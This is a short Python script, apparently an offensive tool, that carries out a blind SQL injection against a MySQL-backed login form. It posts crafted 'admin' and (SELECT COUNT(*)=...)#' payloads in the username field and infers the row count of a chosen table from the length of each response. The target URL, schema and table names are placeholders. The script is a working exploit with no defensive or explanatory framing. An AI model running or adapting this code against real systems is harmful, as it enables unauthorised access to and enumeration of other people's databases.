# MYSQL - Blind sqli

from requests import post

class Attack:
    URL = 'https://vuln/login.php'
    SCHEMA_NAME = 'CHANGEME'
    TABLE_NAME = 'CHANGEME'
    DEBUG = True

    def __init__(self) -> None:
        self.get_total_record()

    def get_total_record(self) -> int:
        for guess in range(1, 100):
            p = {"username": f"admin' and (SELECT COUNT(*)={guess} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            if self.DEBUG:
                print(guess, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(total_record)={guess}')
                return guess
    
if __name__ == '__main__':
    Attack()
